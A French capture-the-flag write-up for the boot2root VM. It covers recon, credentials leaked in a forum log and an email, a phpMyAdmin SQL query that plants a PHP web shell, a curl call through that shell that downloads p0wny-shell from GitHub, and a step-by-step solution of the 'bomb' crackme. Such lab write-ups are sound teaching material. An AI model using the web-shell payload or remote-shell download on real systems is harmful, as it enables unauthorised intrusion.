# Writeup #2

## Contexte

Comme nous avons vu dans l'ancien writeup, il
nous a été possible de devenir **root** en remplaçant
simplement le binaire d'**init** par un shell dans les paramètres
kernel.

## Collecte d'informations

En ouvrant notre navigateur internet, dans notre cas firefox, il
est possible d'accéder au site internet HTTPS en ajoutant une exception
SSL.

En utilisant le logiciel **OWASP ZAP**, nous avons pu déterminer
l'existence de plusieurs sous dossier du serveur HTTP:
- /forum
- /phpmyadmin

### Analyse du forum

Les forums utilisent en général des générateurs de page HTML;
ceux-ci ajoutant leurs versions dans la balise meta "generator":

```bash
curl -sk https://$TARGET/forum/ | grep "name=\"generator\""
```

Ce qui nous donne:

```
<meta name="generator" content="my little forum 2.3.4" />
```

D'autre part un naviguant sur le forum nous avons pu observe
la présence d'un topic intéressant a propos d'un *Problème login*.
Le contenu du poste possède la même nomenclature du fichier de log SSH.

En lisant méticuleusement l'extrait du fichier, une ligne nous saute au yeux:

`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`

Le nom de l'utilisateur qui se serait trompe lors de sa connection s'apparente plus a un mot de passe,
une étourderie de la part de l'utilisateur peut être ? En regardant la tentative
juste en dessous, nous pouvons apercevoir l'username **lmezard**:

`Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)`

En testant de se connecter sur le forum avec:
- username: `lmezard`
- password: `!q\]Ej?*5K5cy*AJ`

Il est possible d'accéder au compte et d'avoir accès a plus d'informations a propos de l'utilisateur:

![Boot Menu](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/forum.png)

Nous sommes en possession du mail de l'utilisateur: `laurie@borntosec.net`

### Le serveur IMAP

Lors du premier writeup, nous avons mis en évidence la présence d'un serveur IMAP
sur la VM, connectons nous sur le port sécurisé:

```bash
openssl s_client -connect $TARGET:993
```

A partir de ce [memo](https://busylog.net/telnet-imap-commands-note/) du protocole, nous
allons examiner le compte:

```bash

* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN] Dovecot ready.

a LOGIN laurie@borntosec.net !q\]Ej?*5K5cy*AJ

a OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS MULTIAPPEND UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS] Logged in

a LIST "*" "*"

* LIST (\NoInferiors \UnMarked) "/" "INBOX.Drafts"
* LIST (\NoInferiors \Marked) "/" "INBOX.Sent"
* LIST (\NoInferiors \UnMarked) "/" "INBOX.Trash"
* LIST (\NoInferiors \UnMarked) "/" "INBOX"
a OK List completed.

a SELECT "INBOX.Sent"

* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1444339365] UIDs valid
* OK [UIDNEXT 3] Predicted next UID
* OK [HIGHESTMODSEQ 1] Highest
a OK [READ-WRITE] Select completed.

a FETCH 1 BODY[]

* 1 FETCH (BODY[] {1722}
Received: from 192.168.1.22
        (SquirrelMail authenticated user laurie@borntosec.net)
        by 192.168.1.8 with HTTP;
        Thu, 8 Oct 2015 23:22:45 +0200
Message-ID: <38e4cbc743bb95cd2402bf0bc47602b3.squirrel@192.168.1.8>
Date: Thu, 8 Oct 2015 23:22:45 +0200
Subject: Very interesting !!!!
From: laurie@borntosec.net
To: ft_root@mail.borntosec.net
User-Agent: SquirrelMail/1.4.22
MIME-Version: 1.0
Content-Type: text/plain;charset=iso-8859-1
Content-Transfer-Encoding: 8bit
X-Priority: 3 (Normal)
Importance: Normal

WinDev est un atelier de g�nie logiciel (AGL) �dit� par la soci�t�
fran�aise PC SOFT et con�u pour d�velopper des applications,
principalement orient�es donn�es pour Windows 8, 7, Vista, XP, 2008, 2003,
2000, mais �galement pour Linux, .Net et Java. Il propose son propre
langage, appel� le WLangage. La premi�re version de l'AGL est sortie en
1993. Apparent� � WebDev et WinDev Mobile.

La communaut� autour de WinDev
Tour De France Technique
Chaque ann�e, entre le mois de mars et le mois de mai, PC SOFT organise
dans toute la France ce qu'ils appellent le TDF Tech (Tour De France
Technique). Cet �v�nement d'une demi-journ�e a pour but d'informer et de
pr�senter les nouveaut�s de chaque version. Pendant cette courte
formation, les diff�rents intervenants utilisent un grand nombre
d'applications pr�-con�ues dans lesquelles ils ont int�gr� les multiples
nouveaut�s, tout en exploitant le mat�riel (serveurs, t�l�phones) qu'ils
ont apport�. Non seulement, WinDev est largement mis en avant, mais aussi
les autres environnements : WebDev et WinDev Mobile. Le code source des
sujets pr�sent�s ainsi qu'un support de cours sont remis � chaque
participant.
)
a OK Fetch completed.
a SELECT "INBOX.Sent"
* OK [CLOSED] Previous mailbox closed.
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1444339365] UIDs valid
* OK [UIDNEXT 3] Predicted next UID
* OK [HIGHESTMODSEQ 1] Highest
a OK [READ-WRITE] Select completed.

a FETCH 2 BODY[]

* 2 FETCH (BODY[] {629}
Received: from 192.168.1.22
        (SquirrelMail authenticated user laurie@borntosec.net)
        by 192.168.1.8 with HTTP;
        Thu, 8 Oct 2015 23:25:25 +0200
Message-ID: <e231e4a59416c44fd367fc5eeff1e8f5.squirrel@192.168.1.8>
Date: Thu, 8 Oct 2015 23:25:25 +0200
Subject: DB Access
From: laurie@borntosec.net
To: ft_root@mail.borntosec.net
User-Agent: SquirrelMail/1.4.22
MIME-Version: 1.0
Content-Type: text/plain;charset=iso-8859-1
Content-Transfer-Encoding: 8bit
X-Priority: 3 (Normal)
Importance: Normal

Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
)
a OK Fetch completed.
```

Des credentials de BDD:
- username: `root`
- password: `Fg-'kKXBj87E:aJ$`

### PHPmyAdmin

Comme nous savons que phpmyadmin est installe sur le serveur,
nous pouvons utiliser les credentials pour se connecter:

![phpmyadmin](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/phpmyadmin.png)

En se basant sur cet [article](http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2) nous allons
mettre en place un shell pour exécuter des commandes a distance:

```sql
select "<?php $o = shell_exec($_REQUEST['x']); echo $o ?>" into outfile "/var/www/x.php";
```

Seulement le serveur nous renvois une erreur:
```
#1 - Can't create/write to file '/var/www/x.php' (Errcode: 13)
```

Il nous faut un dossier dans lequel nous avons les droits d'écriture.
En lisant la [documentation](https://github.com/ilosuna/mylittleforum/wiki/Installation) d'installation
du forum:

> Depending on your server configuration the write permission of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script

Le dossier **template_c** semble correct:

```sql
select "<?php $o = shell_exec($_REQUEST['x']); echo $o ?>" into outfile "/var/www/forum/templates_c/foo.php"
```

![phpmyadmin](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/phpmyadmin2.png)

Succès ! Nous pouvons désormais installer un shell plus fancy:

```bash
curl -sk "https://$TARGET/forum/templates_c/foo.php?x=curl -O https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php"
```

![shell](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/shell.png)

Un nouveau jeu de credentials ! `lmezard:G!@M6f4Eatau{sF"`

### FTP

En testant les identifiant sur le serveur FTP,
nous avons accès a un dossier:

![ftp](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/ftp.png)

Nous telechargeons son contenu:

```
$ cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
$ file fun
/tmp/fun: POSIX tar archive (GNU)
```

## Exploitation

```
$ tar xf fun

$ ls ft_fun
00M73.pcap
01IXJ.pcap
0564G.pcap
05GXI.pcap
08GIC.pcap
08UKO.pcap
0B2GJ.pcap
0D70A.pcap
0E2HD.pcap
0EQD2.pcap
...
ZLAL8.pcap
ZM2BG.pcap
ZOUC4.pcap
ZP1ZN.pcap
ZPY1Q.pcap
ZQTK1.pcap

$ cat 00M73.pcap
void useless() {

//file12

$ cat 01IXJ.pcap
}void useless() {

//file265
```

Les fichiers sont en réalité un seul fichier source C fragmente. A l'aide du commentaire de la dernière ligne de chaque fichier, on peut récupérer le l'ordre réel des fichiers.

```
$ ./scripts/lmezard_ftp.py ft_fun > res.c

$ gcc res.c

$ ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit

$ printf "Iheartpwnage" | openssl sha -sha256
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

### SSH (laurie)

Nous pouvons distinguer l'existence d'un crack-me dans
le $HOME de laurie.

```
$ ssh laurie@$TARGET
password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

$ ls
README
bomb

$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
$ file bomb
bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.0.0, not stripped
```
Pour la suite nous utiliserons [ghidra](https://ghidra-sre.org/), un logiciel de reverse engineering avec bomb comme executable.
Ci-dessous un screen de la structure du programme.

`main`

![main](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/main.png)

Le programme est donc structure en 6 phases.
Il faut arriver au bout des 6 phases pour defuse la bombe.

`phase_1`

![phase_1](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_1.png)

Ici, c'est juste une simple comparaison avec la chaine `Public speaking is very easy.`

`phase_2`

![phase_2](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_2.png)

L'utilisateur ici doit rentrer un suite de six nombres separes par un espace (" ").
La bombe "explose" si le premier chiffre est different de 1.
La bombe explose si les nombres suivant ne respectent pas la suite:
`U1 = 1; Un = n * U(n-1)`

On en deduit la suite suivante: `1 2 6 24 120 720`

`phase_3`

![phase_3](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_3.png)

L'utilisateur doit rentrer une ligne au format: nombre - caratere - nombre
Le premier nombre determine quel switch case est execute.
Par exemple si on rentre 1, on sera dans le case 1.
Ensuite le caractere de l'utilisateur sera compare avec un caractere predefini; dans notre exemple "b".
Enfin le dernier nombre sera compare lui aussi par un nombre predefini; ici 0xd6, soit 214.
Si les trois sont egaux aux valeurs predefinies du programme, la bombe passe a l'etape suivant,
sinon elle explose. Ce raisonnement est valide pour tous les cases de la phase.

`phase_4`

![phase_4](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_4.png)

`phase_4_bis`

![phase_4_bis](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_4_bis.png)

Le programme attend un nombre et le passe a la fonction fun4. Il compare le retour de la fonction avec la valeur 55.
Si ce n'est pas la bonne valeur la bombre explose.
En regardant le contenu de fun4, on se rend compte vite qu'il s'agit de la suite de fibonnaci.
55 etant le 9eme terme de la suite, il faut donc rentrer le chiffre 9 pour passer a l'etape suivante.

`phase_5`

![phase_5](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_5.png)

`phase_5_bis`

![phase_5_bis](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_5_bis.png)

Le programme attend une chaine de carateres. Si la longueur est differente de 6 la bombe explose.
Ensuite il parcourt la chaine, et effecteur les instructions suivant pour chaque caratere:
- Soit v la valeur ascii du caratere
- Posons tmp = v & 0xf (ne garde que les 4 bits de poids faible)
- utilise tmp comme index d'un tableau en global nomme `array.123`
- recupere array.123[tmp] et stocke le dans un nouveau tableau `local_c`

Enfin le programme verifie que le tableau est egal a la chaine `giants`, sinon la bombe explose.
Ici nous utiliseront la chaine `opekmq`; bien que `opekma` soit valide aussi.

`phase_6`

![phase_6](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_6.png)

`nodeStruct`
```C
struct nodeStruct {
    int value;
    int index;
    struct nodeStruct *next;
};
```

Le programme attends une suite de six nombres, sinon la bombe explose.
Ici plusieurs boucles s'operent. La premiere verifie que chaque chiffre est entre 1 et 6, et differents les un des autres.
La deuxieme recupere le pointeur d'un noeud d'une liste chainee a l'index precise par un chiffre.
Pour chaque chiffre (index), le pointeur est stocke dans un tableau de pointeur.
Ensuite les champs next de chaque noeud sont reordonnes en fonction de l'ordre precise par l'utilisateur.
Enfin le programme verifie que dans ce nouvel ordre la `value` de chaque est bien en ordre decroissant.
Sinon la bombe explose.

Bien qu'il y ait une phase secrete, et plusieurs solutions a la phase 3 et 5; grace aux indices du README il est possible
d'ignorer la phase secrete et de restreindre le champs des solutions.

On se retrouve donc a la fin avec la chaine suivante:
`Publicspeakingisveryeasy.126241207201b2149opekmq426315`

Toutefois, probablement par inattention de la part du createur du sujet les deux avant-derniers carateres sont inverses (3 - 1)
par rapport a ce qui est necessaire pour defuse la bombe. Ce dernier point etait indique sur le forum.

### SSH (thor)

```
$ ssh thor@$TARGET
password: Publicspeakingisveryeasy.126241207201b2149opekmq426135

(thor) $ ls
exploit_me
README
```
